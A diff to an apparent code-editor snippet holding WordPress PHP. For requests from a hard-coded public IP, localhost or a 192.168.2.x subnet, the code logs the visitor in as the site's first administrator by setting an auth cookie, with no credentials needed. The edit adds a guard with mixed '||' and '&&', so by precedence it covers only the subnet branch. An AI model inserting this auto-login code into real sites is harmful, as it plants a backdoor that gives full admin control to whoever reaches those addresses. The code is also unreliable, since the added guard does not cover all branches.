@@ -1,6 +1,6 @@
 <snippet>
 	<content><![CDATA[
-if ( in_array( \$_SERVER['REMOTE_ADDR'], array( '212.36.31.70', '127.0.0.1' ) ) || substr(\$_SERVER['REMOTE_ADDR'], 0, 10) == '192.168.2.' ) {
+if ( in_array( \$_SERVER['REMOTE_ADDR'], array( '212.36.31.70', '127.0.0.1' ) ) || substr(\$_SERVER['REMOTE_ADDR'], 0, 10) == '192.168.2.' && function_exists('is_user_logged_in') ) {
 	if (!is_user_logged_in()) {
 		\$admins = get_users(array('role'=>'administrator'));
 		wp_set_auth_cookie(\$admins[0]->ID, true);
